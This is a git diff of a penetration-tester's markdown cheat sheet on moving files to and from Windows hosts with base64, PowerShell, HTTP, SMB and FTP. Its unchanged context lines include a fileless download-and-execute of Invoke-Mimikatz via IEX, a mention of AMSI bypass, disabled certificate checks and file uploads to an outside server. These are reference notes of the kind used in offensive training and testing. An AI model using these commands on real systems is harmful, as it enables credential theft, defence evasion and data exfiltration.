@@ -1,5 +1,5 @@
-## PowerShell
-### Copying Using Base64 From from Linux to Windows
+### PowerShell
+#### Copying Using Base64 From from Linux to Windows
 
 Verify the MD5 hash of the target file:
 
@@ -33,7 +33,7 @@ Algorithm       Hash                                                            
 MD5             01C0A257EDD3C2E95C25D80A4C18C5CC                                 
 ```
 
-### Copying Using Base64 From from Windows to Linux
+#### Copying Using Base64 From from Windows to Linux
 
 ```bash
 PS C:\users\public\downloads> [Convert]::ToBase64String((Get-Content -path "C:\users\public\hello.py" -Encoding byte))
@@ -63,7 +63,7 @@ garffff@garffff:~/test$ md5sum hello.py
 01c0a257edd3c2e95c25d80a4c18c5cc  hello.py
 ```
 
-### Web Downloads
+#### Web Downloads
 
 Malicious files can be detected by Defender:
 
@@ -92,7 +92,7 @@ When SSL/TLS certificate are not trusted (not tested):
 PS C:\users\public\downloads> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
 ```
-### Web Downloads - Fileless (memory)
+#### Web Downloads - Fileless (memory)
 
 Need to bypass AMSI to load Malicious files into memory:
 
@@ -106,8 +106,7 @@ Then load into memory:
 PS C:\users\public\downloads> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
 ```
-
-### Web Uploads
+#### Web Uploads
 
 Create a uploads webserver:
 
@@ -127,8 +126,7 @@ PS C:\Users\Public\Downloads> Invoke-FileUpload -Uri http://192.168.0.51:8000/up
 [+] File Uploaded:  C:\users\public\downloads\hello.py
 [+] FileHash:  01C0A257EDD3C2E95C25D80A4C18C5CC
 ```
-
-### Web Uploads Using Base64
+#### Web Uploads Using Base64
 
 ```bash
 PS C:\Users\Public\Downloads> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\users\public\downloads\hello.py' -Encoding Byte))
@@ -161,7 +159,7 @@ Connection: Keep-Alive
 
 cHJpbnQoImhlbGxvIHdvcmxkISIp
 ```
-## SMB
+#### SMB
 
 Create SMB server:
 
@@ -191,8 +189,7 @@ Using a username and password:
 c:\Users\Public\Downloads> net use x: \\192.168.220.133\share /user:garffff password
 c:\Users\Public\Downloads> copy x:\hello.py
 ```
-
-## FTP - Download
+#### FTP - Download
 
 Create FTP server:
 
@@ -210,8 +207,7 @@ Copy file:
 ```bash
 PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('ftp://192.168.0.51/hello.py', 'C:\Users\Public\downloads\hello.py')
 ```
-
-### FTP - Upload
+#### FTP - Upload
 
 Create writable FTP server
 
